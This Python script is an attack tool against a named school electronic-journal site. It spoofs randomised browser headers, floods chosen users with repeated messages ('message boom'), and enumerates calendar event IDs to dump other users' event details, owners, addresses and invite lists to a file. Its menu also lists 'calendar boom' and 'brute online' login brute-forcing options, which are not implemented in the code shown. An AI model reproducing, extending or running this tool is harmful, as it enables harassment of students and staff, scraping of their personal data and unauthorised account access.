import requests
from bs4 import BeautifulSoup
import random
import os
import time
import json

BASE = "https://eljur.gospmr.org"
# logo
logo = r"""
███████╗ ██╗      ██████╗ ██████╗   █████╗  ██████╗ ██╗  ██╗
██╔════╝ ██║     ██╔════╝ ██╔══██╗ ██╔══██╗ ██╔════╝ ██║ ██╔╝
█████╗   ██║     ██║      ██████╔╝ ███████║ ██║      █████═╝ 
██╔══╝   ██║     ██║      ██╔══██╗ ██╔══██║ ██║      ██╔═██╗ 
███████╗ ███████╗╚██████╗ ██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗
╚══════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝
"""

login = ""
password = ""
domain = ""

session = requests.Session()

# функция измены ссесии
def ses_update():
    session.headers.update({
        "User-Agent": (
            f"Mozilla/{random.randint(2, 5)}.0 (Linux {random.randint(1, 1000000)}; Android {random.randint(1, 1000000)}); CPH2841) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{random.randint(70, 126)}.0.0.0 Mobile Safari/{random.randint(20, 537)}.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Origin": BASE,
        "Referer": f"{BASE}/authorize",
    })


ses_update()

# функция получение html от url
def get_soup(url):
    r = session.get(url)
    r.encoding = "utf-8"
    return BeautifulSoup(r.text, "html.parser")


# функция регистрации элжура в ссесии (надо проверить работу)
def reg(login_val, password_val):
    global domain
    data = {
        "username": login_val,
        "password": password_val,
        "return_uri": "/",
    }
    try:
        response = session.post(f"{BASE}/ajaxauthorize", data=data)
        if response.json == {'actions': [], 'errors': [{'field': None, 'text': 'Неверный логин или пароль'}],
                             'result': False}:
            return "Неверный логин или пароль"
        elif r""""result":true""" in str(response.text):
            domain = json.loads(str(json.loads(str(response.text))["actions"]).replace("[", "").replace("]", "").replace("'", '"'))["url"].replace(f"/?user={login_val}&domain=", "")
            return "ok"
        else:
            return response.text
    except Exception as e:
        return e



# функция создания календаря
def newcal(title="Новое событие", canEdit=True, description="Описание события", calendar_id="1220",
           datetime_start="2026-10-31 09:00:00", datetime_end="2026-10-31 10:00:00", presence="at_will",
           place_type="school", place_value="", status="published"):
    data = {
        "CalendarEvent": {
            "title": title,
            "canEdit": canEdit,
            "description": description,
            "calendar_id": calendar_id,
            "datetime_start": datetime_start,
            "datetime_end": datetime_end,
            "presence": presence,
            "place_type": place_type,
            "place_value": place_value,
            "status": status
        }
    }
    response = session.post(f"{BASE}/journal-calendar-api-action/type.event/action.create", json=data)
    return response.text


# функция отправки сообщения
def go_mess(id_in, description, tema, csrf):
    data = {
        "subject": tema,
        "message": description,
        "receivers": id_in,
        "vfiles": [],
        "csrf": csrf,
        "resources": ""
    }
    response = session.post(f"{BASE}/journal-messages-send-action", json=data)
    print(response.text)


# функция получение календаря по его счёту
def razved_cal(iddd):
    return session.get(
        f"https://eljur.gospmr.org/journal-calendar-api-action/type.event/action.one?id={iddd}").text.encode(
        'utf-8').decode('unicode_escape')


# функция интерфейса для введения логина и пароля
def login_password():
    global login, password
    while True:
        print(logo)
        print("\n                  ВВЕДИТЕ ЛОГИН\n")
        login = input("login>>  ")
        password = input("password>>  ")
        pp = reg(login, password)
        if pp == "ok":
            break
        elif pp == "Неверный логин или пароль":
            print("\n  Неверный логин или пароль")
            time.sleep(2)
            os.system("clear")
            continue
        else:
            print(f"\n  ошибка  {pp}")
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()


# функция интерфейса меню (не доделана)
def menu():
    global domain
    while True:
        print(logo)
        print(f"\n                  ВВЕДИТЕ НОМЕР ДЕЙСТВИЯ      domain={domain}\n\n  1)message boom\n  2)scan calendar\n  3)calendar boom\n  4)brute online\n  99)exit")
        go = input(" >>   ")
        if go == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            message_go()
        elif go == "2":
            os.system('cls' if os.name == 'nt' else 'clear')
            calendar_scan()
        elif go == "3":
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        elif go == "4":
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        elif go == "99":
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        else:
            print(f"\n         ВВЕДИТЕ КОРЕКТНЫЙ НОМЕР")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')
            continue


# функция интерфейса для отправки сообщения
def message_go():
    print(logo)
    print("\n                  Вы выбрали message boom\n")
    reg(login, password)
    n = int(input("n>>  "))
    id = {}
    for i in range(1, n + 1):
        id[str(n)] = str(input(f"id_{i}>>  "))
    desc = input("description>>  ")
    tit = input("title>>  ")
    nn = int(input("N>>  "))
    dd = get_soup(f"{BASE}/journal-messages-compose-action")
    csrf = dd.find("input", id="csrf")["value"]
    for i in range(1, nn + 1):
        for i in id:
            go_mess([id[str(i)]], desc, tit, csrf)
            print(f"Сообщение {nn} для {id[str(i)]} было отправленно")
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()

# функция интерфейса для сканирование календарей
def calendar_scan():
    print(logo)
    print("\n                  Вы выбрали scan calendar\n")
    min = int(input("min>>  "))
    max = int(input("max>>  "))
    log_file = input("log_file>>  ")
    reg(login, password)
    with open(log_file, "w", encoding="utf-8", errors="ignore") as f:
        while min <= max:
            razvedjson = json.loads(razved_cal(min))
            if razvedjson != {'result': False, 'error': 'Событие не найдено', 'formErrors': None}:
                razvedjson = razvedjson["result"][str(min)]
                f.write(f"{min}:\nheader: {razvedjson["header"]}\ntitle: {razvedjson["title"]}\naudience: {razvedjson["audience"]}\ncorner: {razvedjson["corner"]}\ncolor: {razvedjson["color"]}\ncanEdit: {razvedjson["features"]["canEdit"]}\nlabel: {razvedjson["label"]}\ncalendar_id: {razvedjson["payload"]["calendar_id"]}\ntitle_payload: {razvedjson["payload"]["title"]}\ndescription: {razvedjson["payload"]["description"]}\nowner_uid: {razvedjson["payload"]["owner_uid"]}\nstatus: {razvedjson["payload"]["status"]}\ndatetime_start: {razvedjson["payload"]["datetime_start"]}\ndatetime_end: {razvedjson["payload"]["datetime_end"]}\nresponsible_uid: {razvedjson["payload"]["responsible_uid"]}\ncreated_at: {razvedjson["payload"]["created_at"]}\nupdated_at: {razvedjson["payload"]["updated_at"]}\npresence: {razvedjson["payload"]["presence"]}\nparent_event_id: {razvedjson["payload"]["parent_event_id"]}\nplace_type: {razvedjson["payload"]["place_type"]}\nurl: {razvedjson["payload"]["url"]}\nroom: {razvedjson["payload"]["room"]}\nroom_id: {razvedjson["payload"]["room_id"]}\naddress: {razvedjson["payload"]["address"]}\nresult: {razvedjson["payload"]["result"]}\naudience: {razvedjson["payload"]["audience"]}\nud_type: {razvedjson["payload"]["ud_type"]}\noptions: {razvedjson["payload"]["options"]}\nview_access: {razvedjson["payload"]["view_access"]}\neventCalendar: {razvedjson["payload"]["eventCalendar"]}\ninviteList: {razvedjson["payload"]["inviteList"]}\npv_shooting_required: {razvedjson["payload"]["pv_shooting_required"]}\ntech_spec_required: {razvedjson["payload"]["tech_spec_required"]}\nowner: {razvedjson["payload"]["owner"]}\nplace_value: {razvedjson["payload"]["place_value"]}\npeople: {razvedjson["payload"]["responsible"]}\n\n")
                print(f"{min} готов")
            else:
                print(f"{min} нету")
            min += 1
        f.close()
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()

# вызов функции интерфейса, начало работы
login_password()
